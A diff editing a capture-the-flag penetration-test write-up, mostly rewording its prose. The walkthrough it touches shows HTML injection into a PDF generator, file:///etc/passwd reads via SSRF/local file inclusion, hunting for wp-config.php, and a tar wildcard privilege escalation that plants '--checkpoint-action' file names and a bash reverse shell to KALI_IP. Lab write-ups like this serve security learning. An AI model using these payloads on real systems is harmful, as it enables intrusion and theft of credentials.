@@ -92,7 +92,7 @@ The "internal" subdomain appears to generate PDFs based on the form.
 
 ![](images/4.PNG)
 
-We can try to inject `<h1>asdf</h1>` in a field to see if it will display in the outputted PDF file. It does. We can potentially attack this with SSRF or local file inclusion. Trying `<iframe height="2000" width="800" src="file:///etc/passwd"></iframe>` doesn't work though.
+We can try to inject `<h1>asdf</h1>` in a field to see if it will display in the outputted PDF file. It does. We can potentially attack this with SSRF or local file inclusion due to Unvalidated User Input. Trying `<iframe height="2000" width="800" src="file:///etc/passwd"></iframe>` doesn't work though.
 
 ![](images/5.PNG)
 
@@ -116,7 +116,7 @@ Page size:          8.26 × 11.69 in (portrait)
 Fast web view:      No
 ```
 
-A quick search reveals that this program is vulnerable to local file inclusion and SSRF. We can try to get the server to read us some data.
+A quick search reveals that this program is vulnerable local file inclusion and SSRF. We can try to get the server to read us some data. This information will be useful to find new avenues to attack and gain further access to the system.
 
 On kali, we host a file by running `service apache2 start`. Then we create a payload in /var/www/html/ named payload.php.
 ```php
@@ -135,7 +135,7 @@ Success. We can read /etc/passwd.
 
 ![](images/6.PNG)
 
-We edit the payload to see what user is running.
+We edit the payload so that we can confirm the current user's username.
 
 ```php
 <?php
@@ -147,7 +147,7 @@ Uid 33 33 = www-data from the /etc/passwd we got earlier.
 
 ![](images/7.PNG)
 
-Tried to see if we can access logs for Log Poisoning. Fruitless, just gives a blank iframe.
+We tried to see if we can access logs for Log Poisoning. Fruitless, just gives a blank iframe.
 ```
 /var/log/auth.log
 /var/log/apache2/access.log
@@ -155,7 +155,7 @@ Tried to see if we can access logs for Log Poisoning. Fruitless, just gives a bl
 /var/log/apache2/error.log
 ```
 
-Tried to read wp-config.php. We know that the website is being run out of /var/www, so the file is somewhere in the directory/subdirectory. The last one worked.
+We tried to read wp-config.php. We know that the website is being run out of /var/www, so the file is somewhere in the directory/subdirectory. The last one worked.
 ```
 /var/www/wp-config.php
 /var/www/html/wp-config.php
@@ -242,13 +242,13 @@ cd /var/www/internal/invoices
 tar -zcf /home/kyle/backups/invoices.tgz *
 ```
 
-We can do a tar wildcard exploit.
+In the script, we can see that it creates a backup in /home/kyle which we cannot access. We cannot do this as our current user, so it means that we may be able to escalate our priviliges with this. We can try to do a tar wildcard exploit.
 
 ```bash
 cd /var/www/internal/invoices; echo "/bin/bash -c 'bash -i >& /dev/tcp/KALI_IP/9999 0>&1'" > shell.sh; echo "" > "--checkpoint-action=exec=sh shell.sh"; echo "" > --checkpoint=1; chmod 777 shell.sh
 ```
 
-When the cron job runs again in a minute, we get a shell on our end.
+When the cron job runs again in a minute, we get a shell on our end as `kyle`.
 
 ## Root Privesc
 
